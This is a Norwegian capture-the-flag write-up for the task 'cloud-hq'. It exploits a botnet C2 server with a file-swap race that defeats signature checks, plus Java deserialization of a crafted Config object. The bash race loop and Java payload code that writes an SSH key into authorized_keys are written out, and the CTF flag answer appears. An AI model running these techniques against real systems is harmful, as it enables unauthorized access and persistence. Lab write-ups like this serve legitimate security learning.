# 2.09_cloud-hq

Her var vi to stk som holdt på sammen, forrige flagg hinter om å se på test-3. Den er aktiv. Ser jeg kan sende `cmd_sysinfo` til den via admin api på servern så kjører følgende kommando:

```bash
curl -F 'file=@./cmd_sysinfo' -v localhost/f52e6101/DEADBEEFDEADBEEF/commands 
# Venter 2 minutter til den har kjørt og sender output og så:
curl localhost/f52e6101/DEADBEEFDEADBEEF/checkins
```

Der ligger `cmd_sysinfo` som kjører `hostname;id;ip a`

```bash
Executing command 'hostname;id;ip a':
cloud-hq-79
uid=1000(oper) gid=1000(oper) groups=1000(oper)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4753: eth0@if4754: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:16:c6 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.22.198/27 brd 10.1.22.223 scope global eth0
       valid_lft forever preferred_lft forever
```

Så neste target er `oper@cloud-hq-79`. Der er SSH åpent men vi får ikke gjort noe mer, så jeg prøver masse forskjellige ting men ender opp med å forstå at man skal sende en payload til klienten via botnet.

Ser også i Python servern at den laster opp filen i `/tmp/.../tmpXXXXX` og sletter den. Klarer å lage et script som looper og ser den nye fila. Men forstår ikke helt meningen med det.

Etter flere dager med sjekking hører jeg med Roys om han vet noe, han nevner at vi ikke er på villspor med denne filen. Så jeg prøver vider, filen vi laster opp blir lagret i `/tmp/.../tmpXXXXX`. Og ser så at den blir lastet en gang for å verifiseres, og en ny gang for å addes til database. Så om vi bytter ut filen så kan vi få opp usignert data. Så kjør dette scriptet mens vi laster opp en gyldig kommando så vil den lastes opp for levering til tjenesten. 

Laster jeg opp en ugyldig fil krasjer den med stacktrace som den senere leverer til `/checkins`. Her kjører jeg følgende scripts mens jeg sender en config fil som jeg fant i `/commands` api for ´DEADBEEFDEADBEEF`. Noe tyder på at kanskje jeg skal bruke config filer allerede. Men tanken blir glemt.

```bash
replacementFile=/home/archive/filename
while true; do
  file=$(ls /tmp/.../tmp* 2> /dev/null)
  if [ $? -eq 0 ]; then
    cp -f $replacementFile $file
    chmod 777 $file
    echo "Intercepted $file"
    ls -lah /tmp/.../
    sleep 1
  fi
done
```

Får da at den interceptet filen og etter 2 minutter får jeg følgende i databasen. Og det stemmer, det var en config fil jeg byttet ut med. 

```java
+--------------------
| 2023-01-05 13:07:09

java.lang.ClassCastException: class utils.Config cannot be cast to class commands.Command (utils.Config and commands.Command are in unnamed module of loader 'app')
        at Client.checkInWithC2(Client.java:49)
        at Client.loopForever(Client.java:65)
        at Client.main(Client.java:106)
```

Så nå vet vi hvordan vi kan sende kommandoer til servern. Nå må vi bare finne utav hvordan vi kan gjøre de gylidge. Prøvde å modifisere eksisterende `cmd_sysinfo` med `whoami` som value. Men det hjelper ikke, feiler på signering. 

Har laget en custom cmd_key som skriver key til authorized_keys. Men for å få kjøre denne må vi se litt dypere. Dennne [snyk](https://snyk.io/blog/serialization-and-deserialization-in-java/) artikkelen snakker om farene med deserialisering i java. 

Med sitatet som Decoy så:

> Also, note that if an application accepts serialized objects, the object is deserialized before being cast to the desired type.

Så om vi sender et Config objekt vil det bli deserialisert først som det, og config objektet har en `readObject` funksjon som blir kjørt ved deserialisering. Denne funksjonen vil ta alle `pendingCommands` i objektet og legge i en kø for kjøring. Dette blir ikke verifisert. Etter mye loking fikk jeg denne enkle java filen som brukte de eksisterende klientklassene for å lage filen [CreateCustomConfig.java](CreateCustomConfig.java):


```java
import commands.*;
import utils.Config;

public class CreateCustomConfig {

    public static void main(String[] args) {
        Config cfg = new Config();
        cfg.id = "DEADBEEFDEADBEEF";
        cfg.sleepDuration = 10;
        cfg.serverURL = "http://shady-aggregator.utl/f52e6101/";
        
        Execute cmd = new Execute();
        cmd.value = "echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGlOA7NSrkCKybk4G/Ss+l/bhGua5j2xXBL3mEX7uq+ login@login >> ~/.ssh/authorized_keys";
        cfg.pendingCommands.add(cmd);
        
        cfg.persist();
    }

}
```

Legger denne inn i client kilden fra `2.04_anvilnotes_source` og bygger den og får en java class fil jeg kan kjøre. Kjører denne og får .config i mappa som jeg da sender via botnet servern og etter to minutter har jeg ssh tilgang til boksen og finner flagget i en fil.

```
Kategori: 2. Oppdrag
Oppgave:  2.09_cloud-hq
Svar:     fbebd09d4e919c682ddca62282e271d4
Poeng:    10

Det er noe veldig tilfredstillende med å utnytte sårbarheter i skadevare.

Dette ser ut som operatøren bak angrepet mot kraftverket. Jeg legger ssh-nøkkelen hans i oppdragsmappen din mens du går gjennom koden som ligger her.

Ny fil: /home/login/2_oppdrag/sshkey_cloud-hq
```
